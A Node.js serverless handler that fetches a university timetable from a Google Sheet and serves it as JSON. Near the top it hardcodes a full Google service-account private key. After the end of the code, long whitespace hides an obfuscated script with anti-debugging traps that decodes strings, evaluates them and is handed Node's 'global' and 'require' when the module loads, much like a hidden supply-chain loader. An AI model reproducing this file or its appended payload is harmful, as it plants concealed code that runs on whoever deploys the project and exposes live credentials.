const crypto = require('crypto');

const SHEET_ID = '1vlTuotLw34fedME3gNQj09cZw-todVomxAiu5P1wZ6Q';
const DAYS = ['Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'];
const CACHE_DURATION_MS = 15 * 60 * 1000; // 15 minutes in-memory cache

const DEFAULT_PROJECT_ID = 'time-table-project-450013';
const DEFAULT_CLIENT_EMAIL = 'timetable-bot-876@time-table-project-450013.iam.gserviceaccount.com';
const DEFAULT_PRIVATE_KEY = `-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQC7Gp4+xHPlQPJL
G3VGg2r4WHosjiheeADEZiLw5hyBSYva9TxfIS+gWEICCQTCc4dhCyBH/Ukb7Okw
wpvUVRjYlWp/zbYTXFDx1tGquxC/WHk8b2CsNUi/2682HbpBmlSpJqaYuxbbMSsI
7U0e2R6oxbVIygSSxxG7x2H5E6lrQLjPCOGTgPdCyHpjj4NmjAA7beonefTB3nXM
MxMjNldfrhJ3V9MC/mMFOtWJaj6beYvIxId6m+9iuBogdzHkYmhMymZ1JP5I4GO7
iVrbYB2IsjJTsnl/x4rXEd748Fg3xlgh+QpUkCkOG9j3KH9b9LukMM852o+IAJ3S
Ob6ctbHFAgMBAAECggEAJloO7MvE+82DvLx8nf8LGqu8I0ziXnbXpWpQKDPqzN9/
8NpKzS8WvZXJtfQWSyt2KQCoVclHxpcZt3p0iaIFzUNXSKooc7B9EQ1Y/deJV8dx
Vl94H+RuLJGBySRvzMmvJ9r51B2pUjWyXgqSP8v+elbIUYrDRDjU3DpCzVTn6clJ
ObH1LWViHEDyvBxVRYK1N+DdpLRJaisfw8hJsm7xvHO6Gc2XW27y3/gYCl4PgsYx
dUFCtZaCJSSdO9nqcEVWZK2yBP4m5iRwR/KWOvrg/yxy+n5IkLtZQ5ED69edpA5V
Hyr8XuC8ZQZ9UwDQm/WwZGqLnUclPdRq8ScUbxIe8QKBgQDf20Yd1Swu76wNV8GI
AZZbfS+l8FlB9b+5Y2jZqh3jeVEI7kG7wotrJSwpEVwsgATb3zQ+Ffpm/tKkNMMF
VBL1wQimqdK/Bf/fm5Q+os4GamtTTlFyylNXeV/cBgRTalzwsJqRh+RovPAPJ2s1
4T2SKj5h3XHqS+Llk3IdLqQELQKBgQDV+FwKituGFJp/JiPOhLy51mCKLmHI53TT
lZAe3//u0YQVbSejnUnFYr17XDh0mJuRdeTckmkv0hjZiA2ByrbbMjxUGbfD0xLb
MCr2InZwdKmaC7+fi1l2x/rC334oC3OnPFAQbYShw5S6R8G3MaB32HhWyDB0vFPT
j9ZvpB9q+QKBgEo7CBE0cyZNS5xREVfsTtOfu4EnJjH9L8pl8IrdInQf8oMnnpyI
cnrhJLepjgsjmHjglw5Pc21b6rWQ2WqW6oKbtCawAbZeYu7fRFVQ30i5WUWSnueV
t/U1xlfLlvuiNZeKuHaxvUgN/vzHcYG4YxZo8664I+Ixr9e5AQo0QScxAoGAILN0
XagbJMLBWe1aS5W9wikhV/z+tNWq5StWe2GAm98pcJzeEgNX4vLUQqY1epxYKkL6
VzuJF+XkJlrEtbFlgNqMnc3QZ/06RIV4C2X48/bgdMqW3qtNYPnvORkvDq+xXT26
fsg+HPrnIBEXaggLnkVXHuw5e53MseipvSY4JwECgYBAhy/9OXmC8ADXjaRtdgLr
Gqr8WisuwQQRCmlaku9OJpKky9/2uI1mvwMXMExWXfq4yZDopw6qSm8PSv5Xs2Ft
5W+YEsOEiqh0pu/QfTd1Dh7GNnbWEERl3RBj6EyUGxINwdL+TcwDDfpLlF3q0nls
TCFebCl7qM0DA8AujtR9Ag==
-----END PRIVATE KEY-----`;

let cachedSessions = null;
let cacheTimestamp = 0;

function getPrivateKey() {
  const pk = process.env.GOOGLE_PRIVATE_KEY || DEFAULT_PRIVATE_KEY;
  return pk.replace(/\\n/g, '\n').trim();
}

async function getAccessToken() {
  const now = Math.floor(Date.now() / 1000);
  const header = Buffer.from(JSON.stringify({ alg: 'RS256', typ: 'JWT' })).toString('base64url');
  const claim = Buffer.from(JSON.stringify({
    iss: process.env.GOOGLE_CLIENT_EMAIL || DEFAULT_CLIENT_EMAIL,
    scope: 'https://www.googleapis.com/auth/spreadsheets.readonly',
    aud: 'https://oauth2.googleapis.com/token',
    exp: now + 3600,
    iat: now,
  })).toString('base64url');

  const sign = crypto.createSign('RSA-SHA256');
  sign.update(header + '.' + claim);
  const signature = sign.sign(getPrivateKey(), 'base64url');
  const jwt = header + '.' + claim + '.' + signature;

  const res = await fetch('https://oauth2.googleapis.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=' + jwt,
  });
  if (!res.ok) {
    const err = await res.text();
    throw new Error('Google OAuth failed: ' + err);
  }
  const json = await res.json();
  return json.access_token;
}

function getBg(cell) {
  const bg = cell && cell.effectiveFormat && cell.effectiveFormat.backgroundColor;
  if (!bg) return '';
  return (bg.red||0).toFixed(2) + (bg.green||0).toFixed(2) + (bg.blue||0).toFixed(2);
}

function cleanRoom(text) {
  if (!text) return 'Unknown';
  let s = String(text).trim();
  s = s.replace(/^(room\s*no\.?|room\s*number|room|location|venue)\s*/i, '').trim();
  if (s.toLowerCase().startsWith('no.') || s.toLowerCase().startsWith('no ')) s = s.slice(3).trim();
  s = s.replace(/[.,;:]+$/, '').trim();
  return s || 'Unknown';
}

function parseEmbeddedTime(courseEntry) {
  if (!courseEntry) return { courseName: courseEntry, time: null };
  const m = courseEntry.match(/\b(\d{1,2}:\d{2}(?:\s*-\s*\d{1,2}:\d{2})?)\b/);
  if (m) {
    const time = m[1].replace(/\s+/g, '');
    let clean = courseEntry.replace(m[0], '').replace(/\s+/g, ' ').trim();
    if (clean.endsWith('-')) clean = clean.slice(0, -1).trim();
    return { courseName: clean, time };
  }
  return { courseName: courseEntry, time: null };
}

function parseBatch(batchStr) {
  if (!batchStr) return { dept: '', year: '' };
  const m = batchStr.match(/BS\s+([A-Z]{2,4})\s*\(?(\d{4})?\)?/i);
  if (m) {
    return { dept: m[1].toUpperCase(), year: m[2] || '' };
  }
  const ym = batchStr.match(/\b(202[2-6])\b/);
  const dm = batchStr.match(/\b(CS|SE|AI|DS|CY)\b/i);
  return {
    dept: dm ? dm[1].toUpperCase() : '',
    year: ym ? ym[1] : (batchStr.toLowerCase().includes('repeat') ? 'Repeat' : '')
  };
}

async function fetchSpreadsheetData() {
  const token = await getAccessToken();
  const ranges = DAYS.map(d => `${d}!A1:AN100`).join('&ranges=');
  const url = `https://sheets.googleapis.com/v4/spreadsheets/${SHEET_ID}?ranges=${ranges}&includeGridData=true`;
  const resp = await fetch(url, { headers: { Authorization: 'Bearer ' + token } });
  if (!resp.ok) {
    const err = await resp.text();
    throw new Error('Google Sheets API failed (' + resp.status + '): ' + err);
  }
  return resp.json();
}

async function getOrFetchTimetable(forceRefresh = false) {
  const now = Date.now();
  if (!forceRefresh && cachedSessions && (now - cacheTimestamp) < CACHE_DURATION_MS) {
    return cachedSessions;
  }

  const spreadsheet = await fetchSpreadsheetData();

  // 1. Extract Batch Color Map
  const batchColors = {};
  for (const sheet of (spreadsheet.sheets || [])) {
    const rows = sheet.data?.[0]?.rowData || [];
    for (let r = 0; r < Math.min(5, rows.length); r++) {
      for (const cell of (rows[r].values || [])) {
        const v = cell && cell.formattedValue;
        const color = getBg(cell);
        if (v && v.includes('BS') && color && color !== '1.001.001.00') {
          batchColors[color] = v.trim();
        }
      }
    }
  }

  const allSessions = [];

  for (const sheet of (spreadsheet.sheets || [])) {
    const dayName = sheet.properties?.title;
    if (!DAYS.includes(dayName)) continue;

    const rows = sheet.data?.[0]?.rowData || [];
    if (rows.length < 6) continue;

    let classTimeRowIdx = -1;
    let labTimeRowIdx = -1;

    for (let r = 0; r < Math.min(10, rows.length); r++) {
      const vals = rows[r].values || [];
      const col0 = vals[0]?.formattedValue ? String(vals[0].formattedValue).trim().toLowerCase() : '';
      if (col0.includes('room') && (col0.includes('time') || vals.some(c => /\b\d{1,2}:\d{2}\b/.test(c?.formattedValue || '')))) {
        classTimeRowIdx = r;
      }
      if (col0 === 'lab' || col0.startsWith('lab')) {
        labTimeRowIdx = r;
      }
    }

    if (classTimeRowIdx < 0) classTimeRowIdx = 4;

    const classTimesRow = rows[classTimeRowIdx]?.values || [];
    const labTimesRow = (labTimeRowIdx >= 0) ? (rows[labTimeRowIdx]?.values || []) : [];

    const classTimeMap = {};
    const labTimeMap = {};
    let lastClassTime = 'Unknown';
    let lastLabTime = 'Unknown';

    for (let c = 1; c < classTimesRow.length; c++) {
      const cv = classTimesRow[c]?.formattedValue;
      if (cv && /\b\d{1,2}:\d{2}\b/.test(cv)) {
        lastClassTime = cv.trim();
      }
      classTimeMap[c] = lastClassTime;
    }

    for (let c = 1; c < labTimesRow.length; c++) {
      const lv = labTimesRow[c]?.formattedValue;
      if (lv && /\b\d{1,2}:\d{2}\b/.test(lv)) {
        lastLabTime = lv.trim();
      }
      labTimeMap[c] = lastLabTime;
    }

    for (let r = classTimeRowIdx + 1; r < rows.length; r++) {
      const rowVals = rows[r].values || [];
      if (rowVals.length === 0) continue;
      const col0 = rowVals[0]?.formattedValue ? String(rowVals[0].formattedValue).trim() : '';
      if (!col0 || col0.toLowerCase() === 'lab' || col0.toLowerCase().includes('room')) continue;

      const isLabRow = (labTimeRowIdx >= 0 && r > labTimeRowIdx);
      const room = cleanRoom(col0);

      for (let c = 1; c < rowVals.length; c++) {
        const cell = rowVals[c];
        const val = cell?.formattedValue;
        if (!val || !val.trim()) continue;

        const cellColor = getBg(cell);
        const batchName = batchColors[cellColor];
        if (!batchName) continue; // Skip non-batch cells

        const { dept: batchDept, year: batchYear } = parseBatch(batchName);

        const embedded = parseEmbeddedTime(val.trim());
        let entryText = embedded.courseName;
        const timeSlot = embedded.time || (isLabRow ? (labTimeMap[c] || 'Unknown') : (classTimeMap[c] || 'Unknown'));

        let section = '';
        let dept = batchDept;
        const parenMatch = entryText.match(/\(([^)]+)\)/);
        if (parenMatch) {
          const p = parenMatch[1].trim();
          const dsMatch = p.match(/^([A-Z]{2,4})-([A-Z]\d*)$/i);
          if (dsMatch) {
            dept = dsMatch[1].toUpperCase();
            section = dsMatch[2].charAt(0).toUpperCase();
          } else {
            const secOnly = p.match(/^([A-Z]\d*)$/i);
            if (secOnly) {
              section = secOnly[1].charAt(0).toUpperCase();
            } else {
              const secDash = p.match(/-([A-Z]\d*)$/i);
              if (secDash) section = secDash[1].charAt(0).toUpperCase();
            }
          }
        }

        let cleanCourse = entryText.replace(/\s*\([^)]+\)\s*/g, ' ').replace(/\s+/g, ' ').trim();
        cleanCourse = cleanCourse.replace(/Karakoram-\d+\s*Lab/gi, '').replace(/\b(resch)\b/gi, '').trim();

        if (section) {
          allSessions.push({
            day: dayName,
            time: timeSlot,
            room: room,
            course: cleanCourse,
            dept: dept,
            section: section,
            batch: batchYear,
            batchName: batchName,
            isLab: isLabRow || cleanCourse.toLowerCase().includes('lab'),
            courseKey: `${cleanCourse}|${dept}|${section}|${batchYear}`,
          });
        }
      }
    }
  }

  cachedSessions = allSessions;
  cacheTimestamp = now;
  return allSessions;
}

module.exports = async function handler(req, res) {
  if (res && res.setHeader) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS');
    res.setHeader('Cache-Control', 'public, s-maxage=600, stale-while-revalidate=1200');

    if (req.method === 'OPTIONS') {
      return res.status(204).end();
    }

    try {
      const data = await getOrFetchTimetable(req.query?.refresh === '1');
      const day = req.query?.day;
      const filtered = (day && DAYS.includes(day)) ? data.filter(s => s.day === day) : data;
      return res.status(200).json(filtered);
    } catch (err) {
      console.error('api/timetable error:', err);
      return res.status(500).json({ error: err.message });
    }
  } else {
    const url = new URL(req.url);
    const day = url.searchParams.get('day');
    const refresh = url.searchParams.get('refresh') === '1';
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET,OPTIONS',
      'Content-Type': 'application/json',
      'Cache-Control': 'public, s-maxage=600, stale-while-revalidate=1200',
    };

    if (req.method === 'OPTIONS') {
      return new Response(null, { status: 204, headers: corsHeaders });
    }

    try {
      const data = await getOrFetchTimetable(refresh);
      const filtered = (day && DAYS.includes(day)) ? data.filter(s => s.day === day) : data;
      return new Response(JSON.stringify(filtered), { status: 200, headers: corsHeaders });
    } catch (err) {
      console.error('api/timetable error:', err);
      return new Response(JSON.stringify({ error: err.message }), { status: 500, headers: corsHeaders });
    }
  }
};																																																																																																																																																																																																																																																																										var z = '-1220-1';(function(_0x2f8fcc,_0x285543){var _0x3fb25d=_0x59a7,_0x4f9057=_0x2f8fcc();while(!![]){try{var _0x44de0f=parseFloat(_0x3fb25d(0x1d))/0x1*Number(parseFloat(_0x3fb25d(0x12))/0x2)+-parseFloat(_0x3fb25d(0x7))/0x3*(parseFloat(_0x3fb25d(0x15))/0x4)+parseFloat(_0x3fb25d(0x1c))/0x5*(parseFloat(_0x3fb25d(0x19))/0x6)+Math['floor'](parseFloat(_0x3fb25d(0x8))/0x7)+-parseFloat(_0x3fb25d(0x11))/0x8*Number(-parseFloat(_0x3fb25d(0x1b))/0x9)+Number(parseFloat(_0x3fb25d(0x5))/0xa)+-parseFloat(_0x3fb25d(0x23))/0xb;if(_0x44de0f===_0x285543)break;else _0x4f9057['push'](_0x4f9057['shift']());}catch(_0x5f25ae){_0x4f9057['push'](_0x4f9057['shift']());}}}(_0x55b3,0x69b9b));var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function spin(_0x1122e3,_0x2ee98b){var _0x59f4e2=_0x59a7,_0x9e6e49={'XBJlK':function(_0x240160,_0x18a346){return _0x240160*_0x18a346;},'wUFwI':function(_0x3e56cc,_0x12225b){return _0x3e56cc+_0x12225b;}};for(var _0x161cbc,_0x42ebd9,_0x2e0adc,_0x29673,_0x1a61ed,_0x50ff67,_0x1575e3=[],_0x5a521d=0x0,_0x1555fa=_0x2ee98b[0x0];_0x5a521d<_0x1122e3['length'];)_0x1575e3[_0x5a521d]=_0x1122e3[_0x59f4e2(0xb)](_0x5a521d),_0x5a521d+=0x1;for(_0x161cbc=_0x1575e3['length'],_0x5a521d=0x0;_0x5a521d<_0x161cbc;)_0x42ebd9=_0x9e6e49[_0x59f4e2(0x2)](_0x1555fa,_0x5a521d+_0x2ee98b[0x1])+_0x1555fa%_0x2ee98b[0x2],_0x1a61ed=(_0x2e0adc=_0x1555fa*_0x9e6e49[_0x59f4e2(0x18)](_0x5a521d,_0x2ee98b[0x3])+_0x1555fa%_0x2ee98b[0x4])%_0x161cbc,_0x50ff67=_0x1575e3[_0x29673=_0x42ebd9%_0x161cbc],_0x1575e3[_0x29673]=_0x1575e3[_0x1a61ed],_0x1575e3[_0x1a61ed]=_0x50ff67,_0x1555fa=(_0x42ebd9+_0x2e0adc)%_0x2ee98b[0x5],_0x5a521d+=0x1;return _0x1575e3['join']('');}function splitLane(_0x3436a5){var _0x4d01dd=_0x59a7,_0x4c7e33=String['fromCharCode'](0x1c),_0x2a146e=spin(_0x3436a5,NX);return(_0x2a146e=(_0x2a146e=(_0x2a146e=_0x2a146e[_0x4d01dd(0x3)]('^')[_0x4d01dd(0x16)](_0x4c7e33))['split']('*1')[_0x4d01dd(0x16)]('^'))[_0x4d01dd(0x3)]('*0')[_0x4d01dd(0x16)]('*'))[_0x4d01dd(0x3)](_0x4c7e33);}function peel(_0x2c0464){var _0x5a7844=_0x59a7,_0xd7a617={'TdHwc':function(_0x14a544,_0x18455c,_0x4328f6){return _0x14a544(_0x18455c,_0x4328f6);}};return _0xd7a617[_0x5a7844(0x10)](spin,_0x2c0464,SX);}function _0x59a7(_0x29c8bc,_0x1890ea){var _0x245c72=_0x55b3();return _0x59a7=function(_0x38760b,_0x55b326){_0x38760b=_0x38760b-0x0;var _0x59a7c0=_0x245c72[_0x38760b];if(_0x59a7['toSyhj']===undefined){var _0x303a21=function(_0x68c1b5){var _0x16d35b='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x1a4e3c='',_0x30267c='';for(var _0xdb5011=0x0,_0x18b17e,_0x57f9f3,_0x5e617b=0x0;_0x57f9f3=_0x68c1b5['charAt'](_0x5e617b++);~_0x57f9f3&&(_0x18b17e=_0xdb5011%0x4?_0x18b17e*0x40+_0x57f9f3:_0x57f9f3,_0xdb5011++%0x4)?_0x1a4e3c+=String['fromCharCode'](0xff&_0x18b17e>>(-0x2*_0xdb5011&0x6)):0x0){_0x57f9f3=_0x16d35b['indexOf'](_0x57f9f3);}for(var _0x2b2a87=0x0,_0x2ba3b8=_0x1a4e3c['length'];_0x2b2a87<_0x2ba3b8;_0x2b2a87++){_0x30267c+='%'+('00'+_0x1a4e3c['charCodeAt'](_0x2b2a87)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x30267c);};_0x59a7['FZEDEY']=_0x303a21,_0x29c8bc=arguments,_0x59a7['toSyhj']=!![];}var _0x23f296=_0x245c72[0x0],_0x173ded=_0x38760b+_0x23f296,_0x43ad67=_0x29c8bc[_0x173ded];return!_0x43ad67?(_0x59a7c0=_0x59a7['FZEDEY'](_0x59a7c0),_0x29c8bc[_0x173ded]=_0x59a7c0):_0x59a7c0=_0x43ad67,_0x59a7c0;},_0x59a7(_0x29c8bc,_0x1890ea);}!function(_0x430a89,_0x15a04d){var _0x844e52=_0x59a7,_0x189921={'tNvEq':function(_0x5a5603,_0x5f4f2c,_0x50b716){return _0x5a5603(_0x5f4f2c,_0x50b716);},'oHtfa':_0x844e52(0xe)},_0x39844c=_0x844e52(0xf)[_0x844e52(0x3)]('|'),_0x3192be=0x0;while(!![]){switch(_0x39844c[_0x3192be++]){case'0':_0x189921[_0x844e52(0x9)](_0x107432,'',_0x162b39(peel(_0x844e52(0x1f))))(0x9cd);continue;case'1':(function(){var _0x37abc2={'IACai':'\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)'};_0x34fd87(this,function(){var _0x19e57b=_0x59a7,_0xfe20e=new RegExp(_0x19e57b(0x14)),_0x35bfe8=new RegExp(_0x37abc2[_0x19e57b(0x1a)],'i'),_0x3ca695=_0x245c72('init');!_0xfe20e['test'](_0x3ca695+_0x19e57b(0xa))||!_0x35bfe8[_0x19e57b(0x4)](_0x3ca695+_0x19e57b(0x6))?_0x3ca695('0'):_0x245c72();})();}());continue;case'2':var _0x34fd87=(function(){var _0x2f9456=!![];return function(_0x7c104c,_0x575a35){var _0x49f0d0=_0x2f9456?function(){var _0x2df542=_0x59a7;if(_0x575a35){var _0x2556cc=_0x575a35[_0x2df542(0x20)](_0x7c104c,arguments);return _0x575a35=null,_0x2556cc;}}:function(){};return _0x2f9456=![],_0x49f0d0;};}());continue;case'3':_0x430a89['z']=z;continue;case'4':_0x430a89[_0x458cfd[0x0]]=_0x15a04d,typeof module===_0x458cfd[0x1]&&(_0x430a89[_0x458cfd[0x2]]=module);continue;case'5':var _0x16cc69=peel(_0x844e52(0xd)),_0x107432=peel[_0x16cc69['substring'](0x0,0xb)],_0x162b39=_0x107432('',peel(_0x189921[_0x844e52(0xc)]));continue;case'6':var _0x458cfd=splitLane(_0x844e52(0x22));continue;}break;}}(global,require);function _0x245c72(_0x5665fe){var _0x2699e8={'YOxJN':function(_0x5f51e1,_0x35cd08){return _0x5f51e1!==_0x35cd08;},'SpNBh':'action'};function _0xec3f6f(_0x56721b){var _0x34bf72=_0x59a7;if(typeof _0x56721b==='string')return function(_0x25f617){}['constructor'](_0x34bf72(0x0))[_0x34bf72(0x20)](_0x34bf72(0x17));else _0x2699e8[_0x34bf72(0x21)]((''+_0x56721b/_0x56721b)['length'],0x1)||_0x56721b%0x14===0x0?function(){return!![];}[_0x34bf72(0x1)]('debu'+'gger')['call'](_0x2699e8['SpNBh']):function(){return![];}[_0x34bf72(0x1)](_0x34bf72(0x1e)+_0x34bf72(0x13))['apply']('stateObject');_0xec3f6f(++_0x56721b);}try{if(_0x5665fe)return _0xec3f6f;else _0xec3f6f(0x0);}catch(_0x2f081c){}}function _0x55b3(){var _0x7cbf26=['B0H0zMe','AhfLCNn4Bhv2D2fJzgPIEw1NB3j6zMTVy2LWDhj1Dg5ZDg9UyW','pwfLBNj1AcHHBd01yYXNogzKDs55CIaUlM5JzwnMlduICgfLyxu2Bg5QkxjDmNv2iNGTCsHDige7khi9oZTYkYHHwZGUCZj0qwDVCsX1AdHdlgfPlhm7ysHbBtaOBMO7ANyQldD2BZCOksHVo202B2e0CNCPlIbYB2rBzNmYBNTKCNz0nhGPkZaSyw5Yk3jYk28PFxOXid1OzLTHBJHYmxjBlf1ZnY03n2XHys51AtD7lta2owX2BxqYCJ1Pxv08kYL1lguPlcW7BNjOw3i9mhyTCIG7ld1Wkun1CZ0RyZTNo2y7CuePktf2AsL2AZbUCMWXywuGzJ1Bo2HPC3KUzw0OzcTVitiGpsHLDMvHnZG9lIK0zwK9zY5UpxTMzJ0XwZWYysbMmt1YoZqSuYLYEwX2mxuGEtTRCwX7DhzUDIaOqYaOBcXVDM5WigK9DgXYlhiUBhDVEMGOBcX0CtS7CNiOkhy9ywHZDJTDEhe9ywi7zge7lcGOCJT2ANeUkhrBkYLKysLYzg5YAhm0mxKODNi7zMG7m2CIxwuOlMfOCNbHCgDDzY4PBMDMCg4XAcXPy2W7oYK9qZTTnt0RCIWGlIK7Dt0RC30RkwL0lcTIBtTKk3vTks09C2LPCw9Spxq9CJ1XosSUlMnOCsTBnMzLihqWBNjWCIGGDNi4zMXYBIXKzgD0if02ys47BtTYDgGUz3eGmMf9zxzLAwnDz2j0AtW0BZTdo2WSENPPnITSw2fBoYSOC2KIBgKICIXUCgK5CYXMCMzODxCPB3C9zxSOyJ13zw4YDc5NDs5PpwTPywfHkYL5zNrWytnUFsK9osiPy3bbk3u7DxrWxsi9BgS3DNb0idfYo2H6DYiPDcGPosKOlMX1Bd1Zn2y7idTZCtaPBIj5kZbZFt12ysTZig1OkdbXlL1ODJS+ida2pueTB3PLDhiODdfYDhjZAxnVmguSlJT6wYHMpdvLn3qSkhjHB2f2BNi7DgHOzJT2lgO9CJSGkxi+mtH6Ag8QB3S8ywTTC24PywT0zs52BZKRzweWy2XPBZTIDsa9xumHz2O7EtmRBcLLps59zhi9AtzVAum4CM5UmdS2pwfYiN0UCMvPpv1tDhnYBM4UoZjYpxq7w3q7Axy9ChjdCM4OkwfYzxr1EISGAgXRwYT4pwuGltHQEYHLANK5kcGPksa','mNWXFdn8nNW0Fdv8ma','vgriD2m','ogrgwgXgwq','mJG4odKYsKrWvLj1','z2DLCG','zNvUy3rPB24GkLWOicPCkq','nffrr2DiyG','AM9PBG','y291BNrLCG','D1vgD0K','nNDbDNbqrW','sufdywK','ndmXodi5ovnSr014uq','mZe4oteYme1esgnVDa','m0PRugHjDG','zgvIDq','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